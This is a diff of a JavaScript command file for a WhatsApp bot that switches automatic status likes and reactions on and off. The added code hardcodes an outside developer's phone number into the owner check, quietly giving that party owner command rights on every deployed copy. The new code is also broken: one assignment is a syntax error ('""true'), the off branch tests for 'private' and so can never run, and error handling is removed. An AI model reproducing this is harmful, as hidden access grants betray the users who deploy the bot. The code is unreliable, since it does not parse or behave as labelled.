@@ -1,64 +1,37 @@
-import config from '../../config.js';
-import { getSetting, setSetting } from '../../lib/settings.js';
-import { sendNewsletter } from '../Sarkar/newsletter.js';
+import Sarkar from '../../config.js';
+import {getSetting, setSetting} from '../../lib/settings.js';
 
-const StatusLikeCmd = async (m, Matrix) => {
-  try {
+const likeCommand = async (m, Matrix) => {
+  const dev = '923253617422@s.whatsapp.net';
     const botNumber = await Matrix.decodeJid(Matrix.user.id);
-    const isAuthorized = [botNumber, config.OWNER_NUMBER + '@s.whatsapp.net'].includes(m.sender);
-    const prefix = config.PREFIX;
-    const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';
-    const text = m.body.slice(prefix.length + cmd.length).trim();
+    const isCreator = [botNumber, Sarkar.OWNER_NUMBER + '@s.whatsapp.net', dev].includes(m.sender);
+    const prefix = Sarkar.PREFIX;
+const cmd = m.body.startsWith(prefix) ? m.body.slice(prefix.length).split(' ')[0].toLowerCase() : '';
+const text = m.body.slice(prefix.length + cmd.length).trim();
 
-    if (cmd === 'statuslike') {
-      if (!isAuthorized) {
-        await sendNewsletter(Matrix, m.from, '*🚫 This command is only for the bot and owner*', {
-          quoted: m,
-          title: '⚠️ Command Restricted',
-          body: 'Authorization Required'
-        });
-        return;
-      }
 
-      let responseMessage;
-      let title = '✨ Status Like Settings ✨';
-      let body = 'Interaction Update';
+    if (cmd === 'statuslike' || cmd === "statusreact") {
+        if (!isCreator) {
+            await Matrix.sendMessage(m.from, { text: "*_📛 THIS IS AN OWNER COMMAND_*" }, { quoted: m });
+            return;
+        }
 
-      if (text === 'on') {
-        config.AUTO_STATUS_LIKE = true;
-        setSetting('statuslike', true);
-        responseMessage = '*✅ Auto Status Like has been enabled*\n_Bot will now automatically like status updates_';
-        body = 'Status Liker Activated';
-      } else if (text === 'off') {
-        config.AUTO_STATUS_LIKE = false;
-        setSetting('statuslike', false);
-        responseMessage = '*❌ Auto Status Like has been disabled*\n_Bot will stop liking status updates_';
-        body = 'Status Liker Deactivated';
-      } else if (text === 'view') {
-        const currentStatus = getSetting('statuslike') ? 'Enabled' : 'Disabled';
-        responseMessage = `*📊 Current Status Like Setting:* ${currentStatus}`;
-        title = 'ℹ️ StatusLike Status';
-        body = 'Current Configuration';
-      } else {
-        responseMessage = `*📌 Status Like Usage:*\n\n• \`${prefix}statuslike on\`  ➜ _Enable Auto Liking_\n• \`${prefix}statuslike off\` ➜ _Disable Auto Liking_\n• \`${prefix}statuslike view\` ➜ _Check Current Setting_`;
-        title = 'ℹ️ StatusLike Help';
-        body = 'Command Guide';
-      }
-
-      await sendNewsletter(Matrix, m.from, responseMessage, {
-        quoted: m,
-        title: title,
-        body: body
-      });
+        if (['on', 'off'].includes(text)) {
+            if (text === 'on') {
+               Sarkar.AUTO_STATUS_REACT = ""true;
+               setSetting('statuslike', true);
+                m.reply(`*_Status React Activated SUCCESSFULLY NOW Bot will React on Status With Random Emoji_*`);
+            } else if (text === 'private') {
+                Sarkar.AUTO_STATUS_REACT = false;
+                setSetting('statuslike', false);
+            m.reply(`*_STATUS LIKES SUCCESSFULLY DEACTIVATED NOW BOT WILL NOT REACTS ON STATUSES_*`);
+            } else {
+                m.reply("Usage:\n.statuslike on/off");
+            }
+        } else {
+            m.reply("Invalid Usage. Please use 'on' or 'off'.");
+        }
     }
-  } catch (error) {
-    console.error("StatusLike Command Error:", error);
-    await sendNewsletter(Matrix, m.from, '*⚠️ An error occurred while processing your request*', {
-      quoted: m,
-      title: '❌ System Error',
-      body: 'Command Failed'
-    });
-  }
 };
 
-export default StatusLikeCmd;
+export default likeCommand;
